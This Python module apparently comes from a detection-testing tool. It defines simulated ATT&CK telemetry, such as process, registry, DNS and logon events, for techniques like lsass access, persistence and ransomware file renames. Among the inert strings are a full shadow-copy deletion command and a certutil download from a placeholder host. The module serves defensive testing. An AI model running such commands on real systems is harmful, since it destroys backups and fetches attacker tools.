"""Emulation plans.

SAFETY: every step here is a *description of telemetry* that a real technique would
produce. Nothing is executed. Command lines are inert strings with placeholder
markers (e.g. `<SIMULATED>`) and never reach a shell. Real Atomic Red Team / Caldera
orchestration is out of scope for this MVP (TODO, Grade B/C, isolated range only).
"""
from __future__ import annotations

from .models import EmulationStep, RankedTechnique

S = "<SIMULATED>"

STEPS: dict[str, EmulationStep] = {s.technique_id: s for s in [
    EmulationStep("T1059.001", "Encoded PowerShell invocation", (
        {"EventID": 1, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         "CommandLine": f"powershell.exe -nop -enc {S}", "ParentImage": "C:\\Windows\\explorer.exe"},)),
    EmulationStep("T1003.001", "Process access to lsass", (
        {"EventID": 10, "TargetImage": "C:\\Windows\\System32\\lsass.exe",
         "SourceImage": "C:\\Users\\Public\\tool.exe", "GrantedAccess": "0x1010"},)),
    EmulationStep("T1047", "WMI process creation", (
        {"EventID": 1, "Image": "C:\\Windows\\System32\\wbem\\WMIC.exe",
         "CommandLine": f"wmic process call create {S}", "ParentImage": "C:\\Windows\\System32\\cmd.exe"},)),
    EmulationStep("T1053.005", "Scheduled task created", (
        {"EventID": 1, "Image": "C:\\Windows\\System32\\schtasks.exe",
         "CommandLine": f"schtasks /create /tn Updater /tr {S} /sc onlogon", "ParentImage": "C:\\Windows\\System32\\cmd.exe"},)),
    EmulationStep("T1547.001", "Run key persistence", (
        {"EventID": 13, "TargetObject": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater",
         "Details": S, "Image": "C:\\Windows\\System32\\reg.exe"},)),
    EmulationStep("T1021.002", "Admin share logon", (
        {"EventID": 5140, "ShareName": "\\\\*\\ADMIN$", "SubjectUserName": "svc_backup"},), "security"),
    EmulationStep("T1486", "Mass file rename to encrypted extension", tuple(
        {"EventID": 11, "TargetFilename": f"C:\\Shares\\finance\\doc{i}.xlsx.locked",
         "Image": "C:\\Users\\Public\\tool.exe"} for i in range(3))),
    EmulationStep("T1490", "Shadow copy deletion", (
        {"EventID": 1, "Image": "C:\\Windows\\System32\\vssadmin.exe",
         "CommandLine": "vssadmin.exe delete shadows /all /quiet", "ParentImage": "C:\\Windows\\System32\\cmd.exe"},)),
    EmulationStep("T1082", "System discovery", (
        {"EventID": 1, "Image": "C:\\Windows\\System32\\systeminfo.exe",
         "CommandLine": "systeminfo", "ParentImage": "C:\\Windows\\System32\\cmd.exe"},)),
    EmulationStep("T1071.001", "Beacon-like HTTPS to rare domain", tuple(
        {"query": "cdn-update.example.invalid", "interval_s": 60} for _ in range(3)), "dns"),
    EmulationStep("T1566.001", "Macro-laden attachment delivered", (
        {"attachment": "invoice.docm", "sender_domain": "example.invalid"},), "mail"),
    EmulationStep("T1110.003", "Password spray pattern", tuple(
        {"result": "failure", "user": f"user{i}", "src_ip": "10.66.0.99"} for i in range(10)), "auth"),
    EmulationStep("T1078", "Logon from unusual host", (
        {"result": "success", "user": "svc_backup", "src_ip": "10.66.0.99", "logon_type": 10},), "auth"),
    EmulationStep("T1105", "Tool download via certutil", (
        {"EventID": 1, "Image": "C:\\Windows\\System32\\certutil.exe",
         "CommandLine": f"certutil -urlcache -f http://example.invalid/{S}", "ParentImage": "C:\\Windows\\System32\\cmd.exe"},)),
]}


def build_plan(ranked: list[RankedTechnique]) -> list[EmulationStep]:
    """Map ranked techniques to simulated steps, preserving priority order."""
    return [STEPS[r.technique.id] for r in ranked if r.technique.id in STEPS]
